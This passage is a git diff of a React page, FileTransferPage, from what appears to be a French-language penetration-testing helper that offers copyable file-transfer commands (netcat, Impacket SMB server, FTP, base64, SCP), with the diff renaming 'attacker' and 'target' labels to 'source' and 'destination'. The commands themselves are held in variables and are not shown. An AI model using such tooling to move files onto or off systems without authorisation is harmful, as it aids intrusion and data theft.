+                                <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('http', 'destination', cmd)}><Copy className="w-3 h-3" /></Button>
+                              </div>
+                              <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
+                            </div>
+                          ))}
                         </div>
-                      ))}
-                    </div>
                   </div>
                 </div>
               </CardContent>
@@ -420,7 +654,7 @@ export const FileTransferPage: React.FC = () => {
             <Card className="border-slate-700 bg-slate-800">
               <CardHeader>
                 <div className="flex items-center justify-between">
-                  <CardTitle className="flex items-center gap-2 text-slate-100"><Shield className="w-4 h-4" /> SCP / SFTP</CardTitle>
+                  <CardTitle className="flex items-center gap-2 text-slate-100"><Shield className="w-4 h-4" /> {getDirectionLabel('SCP / SFTP')}</CardTitle>
                   <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, scp: !e.scp}))}>
                     {expanded.scp ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                   </Button>
@@ -429,13 +663,13 @@ export const FileTransferPage: React.FC = () => {
               {expanded.scp && (
               <CardContent className="space-y-2">
                 <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
-                  <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel}</div>
+                  <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel}</div>
                   <div className="space-y-2">
                     {[{label: 'SCP vers la cible', cmd: scpToTarget}, {label: 'SCP avec port personnalisé', cmd: scpCustomPort}, {label: 'SFTP interactif', cmd: sftpInteractive}].map(({label, cmd}) => (
                       <div key={label} className="bg-slate-800 rounded border border-slate-600">
                         <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                           <span className="text-xs text-slate-400">{label}</span>
-                          <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('scp', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
+                          <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('scp', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                         </div>
                         <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                       </div>
@@ -451,7 +685,7 @@ export const FileTransferPage: React.FC = () => {
             <Card className="border-slate-700 bg-slate-800">
               <CardHeader>
                 <div className="flex items-center justify-between">
-                  <CardTitle className="flex items-center gap-2 text-slate-100"><Network className="w-4 h-4" /> Netcat</CardTitle>
+                  <CardTitle className="flex items-center gap-2 text-slate-100"><Network className="w-4 h-4" /> {getDirectionLabel('Netcat')}</CardTitle>
                   <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, netcat: !e.netcat}))}>
                     {expanded.netcat ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                   </Button>
@@ -461,22 +695,22 @@ export const FileTransferPage: React.FC = () => {
               <CardContent className="space-y-4">
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
-                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {targetLabel} (récepteur)</div>
+                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {destinationLabel} (récepteur)</div>
                     <div className="bg-slate-800 rounded border border-slate-600">
                       <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                         <span className="text-xs text-slate-400">Netcat récepteur</span>
-                        <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('netcat', 'target', ncReceiver)}><Copy className="w-3 h-3" /></Button>
+                        <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('netcat', 'destination', ncReceiver)}><Copy className="w-3 h-3" /></Button>
                       </div>
                       <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{ncReceiver}</code></pre>
                     </div>
                   </div>
                   <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
-                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel} (envoyeur)</div>
+                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel} (envoyeur)</div>
                     {[{label: 'Netcat envoyeur', cmd: ncSender}, {label: 'Avec timeout', cmd: ncTimeout}].map(({label, cmd}) => (
                       <div key={label} className="bg-slate-800 rounded border border-slate-600 mb-2">
                         <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                           <span className="text-xs text-slate-400">{label}</span>
-                          <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('netcat', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
+                          <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('netcat', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                         </div>
                         <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                       </div>
@@ -491,7 +725,7 @@ export const FileTransferPage: React.FC = () => {
             <Card className="border-slate-700 bg-slate-800">
               <CardHeader>
                 <div className="flex items-center justify-between">
-                  <CardTitle className="flex items-center gap-2 text-slate-100"><FileText className="w-4 h-4" /> Base64</CardTitle>
+                  <CardTitle className="flex items-center gap-2 text-slate-100"><FileText className="w-4 h-4" /> {getDirectionLabel('Base64')}</CardTitle>
                   <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, base64: !e.base64}))}>
                     {expanded.base64 ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                   </Button>
@@ -501,13 +735,13 @@ export const FileTransferPage: React.FC = () => {
               <CardContent className="space-y-4">
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
-                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel}</div>
+                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel}</div>
                     <div className="space-y-2">
                       {[{label: 'Encoder en base64 (Linux/macOS)', cmd: b64EncodeLinux}, {label: 'Encoder en base64 (Windows)', cmd: b64EncodeWindows}].map(({label, cmd}) => (
                         <div key={label} className="bg-slate-800 rounded border border-slate-600">
                           <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                             <span className="text-xs text-slate-400">{label}</span>
-                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('base64', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
+                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('base64', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                           </div>
                           <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                         </div>
@@ -515,13 +749,13 @@ export const FileTransferPage: React.FC = () => {
                     </div>
                   </div>
                   <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
-                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {targetLabel}</div>
+                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {destinationLabel}</div>
                     <div className="space-y-2">
                       {[{label: 'Décoder base64 (Linux/macOS)', cmd: b64DecodeLinux}, {label: 'Décoder base64 (Windows)', cmd: b64DecodeWindows}].map(({label, cmd}) => (
                         <div key={label} className="bg-slate-800 rounded border border-slate-600">
                           <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                             <span className="text-xs text-slate-400">{label}</span>
-                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('base64', 'target', cmd)}><Copy className="w-3 h-3" /></Button>
+                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('base64', 'destination', cmd)}><Copy className="w-3 h-3" /></Button>
                           </div>
                           <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                         </div>
@@ -537,7 +771,7 @@ export const FileTransferPage: React.FC = () => {
             <Card className="border-slate-700 bg-slate-800">
               <CardHeader>
                 <div className="flex items-center justify-between">
-                  <CardTitle className="flex items-center gap-2 text-slate-100"><Folder className="w-4 h-4" /> FTP</CardTitle>
+                  <CardTitle className="flex items-center gap-2 text-slate-100"><Folder className="w-4 h-4" /> {getDirectionLabel('FTP')}</CardTitle>
                   <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, ftp: !e.ftp}))}>
                     {expanded.ftp ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                   </Button>
@@ -547,13 +781,13 @@ export const FileTransferPage: React.FC = () => {
               <CardContent className="space-y-4">
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
-                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel}</div>
+                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel}</div>
                     <div className="space-y-2">
                       {[{label: 'Python FTP Server', cmd: ftpServer}, {label: 'FTP avec authentification', cmd: ftpServerAuth}].map(({label, cmd}) => (
                         <div key={label} className="bg-slate-800 rounded border border-slate-600">
                           <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                             <span className="text-xs text-slate-400">{label}</span>
-                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('ftp', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
+                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('ftp', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                           </div>
                           <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                         </div>
@@ -561,13 +795,13 @@ export const FileTransferPage: React.FC = () => {
                     </div>
                   </div>
                   <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
-                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {targetLabel}</div>
+                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {destinationLabel}</div>
                     <div className="space-y-2">
                       {[{label: 'FTP client (Linux)', cmd: ftpClientLinux}, {label: 'FTP client (Windows)', cmd: ftpClientWindows}].map(({label, cmd}) => (
                         <div key={label} className="bg-slate-800 rounded border border-slate-600">
                           <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                             <span className="text-xs text-slate-400">{label}</span>
-                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('ftp', 'target', cmd)}><Copy className="w-3 h-3" /></Button>
+                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('ftp', 'destination', cmd)}><Copy className="w-3 h-3" /></Button>
                           </div>
                           <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                         </div>
@@ -583,7 +817,7 @@ export const FileTransferPage: React.FC = () => {
             <Card className="border-slate-700 bg-slate-800">
               <CardHeader>
                 <div className="flex items-center justify-between">
-                  <CardTitle className="flex items-center gap-2 text-slate-100"><Server className="w-4 h-4" /> SMB</CardTitle>
+                  <CardTitle className="flex items-center gap-2 text-slate-100"><Server className="w-4 h-4" /> {getDirectionLabel('SMB')}</CardTitle>
                   <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, smb: !e.smb}))}>
                     {expanded.smb ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                   </Button>
@@ -593,13 +827,13 @@ export const FileTransferPage: React.FC = () => {
               <CardContent className="space-y-4">
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
-                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {attackerLabel}</div>
+                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel}</div>
                     <div className="space-y-2">
                       {[{label: 'Impacket SMB Server', cmd: smbServer}, {label: 'SMB avec authentification', cmd: smbServerAuth}].map(({label, cmd}) => (
                         <div key={label} className="bg-slate-800 rounded border border-slate-600">
                           <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                             <span className="text-xs text-slate-400">{label}</span>
-                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('smb', 'attacker', cmd)}><Copy className="w-3 h-3" /></Button>
+                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('smb', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                           </div>
                           <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                         </div>
@@ -607,13 +841,13 @@ export const FileTransferPage: React.FC = () => {
                     </div>
                   </div>
                   <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
-                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {targetLabel} (Windows)</div>
+                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {destinationLabel} (Windows)</div>
                     <div className="space-y-2">
                       {[{label: 'Copie depuis SMB', cmd: smbCopy}, {label: 'Robocopy (plus robuste)', cmd: smbRobocopy}].map(({label, cmd}) => (
                         <div key={label} className="bg-slate-800 rounded border border-slate-600">
                           <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                             <span className="text-xs text-slate-400">{label}</span>
-                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('smb', 'target', cmd)}><Copy className="w-3 h-3" /></Button>
+                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('smb', 'destination', cmd)}><Copy className="w-3 h-3" /></Button>
                           </div>
                           <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                         </div>
